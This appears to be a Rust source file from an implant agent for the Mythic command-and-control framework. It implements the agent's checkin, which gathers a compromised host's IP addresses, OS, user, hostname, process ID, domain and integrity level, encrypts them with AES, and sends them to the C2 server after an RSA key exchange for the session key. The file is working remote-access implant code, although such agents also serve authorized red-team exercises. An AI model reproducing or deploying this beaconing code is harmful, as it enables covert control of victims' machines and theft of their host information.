use rand::{Rng, distributions::Alphanumeric};
use rsa::{Oaep, RsaPrivateKey, pkcs8::EncodePublicKey, rand_core::OsRng};
use sha1::Sha1;

use crate::{MythicC2, MythicError, MythicResult, base64_decode, base64_encode, c2::C2Trait};

use super::{
    MythicAgent, aes256_packed, aes256_unpack,
    types::checkin::{ReqCheckin, ReqStagingRSA, RespCheckin, RespStagingRSA},
};

impl MythicAgent {
    pub fn checkin(
        &mut self,
        c2: &mut MythicC2,
        ips: Vec<String>,
        os: Option<String>,
        user: Option<String>,
        host: Option<String>,
        pid: Option<u32>,
        architecture: Option<String>,
        domain: Option<String>,
        integrity_level: Option<u32>,
        external_ip: Option<String>,
        encryption_key: Option<String>,
        decryption_key: Option<String>,
        process_name: Option<String>,
    ) -> MythicResult<RespCheckin> {
        let temp_uuid = if c2.encrypted_exchange_check() {
            let (temp_uuid, aes_psk) = self.encrypted_key_exchange_checkins(c2)?;
            c2.set_aes_psk(aes_psk);
            temp_uuid
        } else {
            self.callback_uuid.clone()
        };
        let req = ReqCheckin::new(
            &self.callback_uuid,
            ips,
            os,
            user,
            host,
            pid,
            architecture,
            domain,
            integrity_level,
            external_ip,
            encryption_key,
            decryption_key,
            process_name,
        );
        let req_msg = serde_json::to_string(&req).map_err(|_| MythicError::Serialize)?;
        let req_packed = aes256_packed(&temp_uuid, &c2.get_aes_psk()?, req_msg)?;
        let resp_packed = c2.checkin(&req_packed)?;
        let resp_msg = aes256_unpack(&temp_uuid, &c2.get_aes_psk()?, resp_packed)?;
        serde_json::from_slice(&resp_msg).map_err(|_| MythicError::Deserialize)
    }

    fn encrypted_key_exchange_checkins(
        &mut self,
        c2: &mut MythicC2,
    ) -> MythicResult<(String, String)> {
        let mut rng = OsRng;
        let private_key = RsaPrivateKey::new(&mut rng, 4096).map_err(|_| MythicError::RsaKeyGen)?;

        let public_key = private_key
            .to_public_key()
            .to_public_key_der()
            .map_err(|_| MythicError::RsaKeyGen)?;
        let public_key_b64 = base64_encode(public_key);

        let session_id = rng
            .sample_iter(&Alphanumeric)
            .take(20)
            .map(char::from)
            .collect();

        let req = ReqStagingRSA::new(public_key_b64, session_id);
        let req_msg = serde_json::to_string(&req).map_err(|_| MythicError::Serialize)?;
        let req_packed = aes256_packed(&self.callback_uuid, &c2.get_aes_psk()?, req_msg)?;
        let resp_packed = c2.checkin(&req_packed)?;
        let resp_msg = aes256_unpack(&self.callback_uuid, &c2.get_aes_psk()?, resp_packed)?;
        let resp: RespStagingRSA =
            serde_json::from_slice(&resp_msg).map_err(|_| MythicError::Deserialize)?;

        let aes_key_enc = base64_decode(resp.session_key)?;
        let aes_key = private_key
            .decrypt(Oaep::new::<Sha1>(), &aes_key_enc)
            .map_err(|_| MythicError::RsaDecrypt)?;
        let aes_psk = base64_encode(&aes_key);
        Ok((resp.uuid, aes_psk))
    }
}
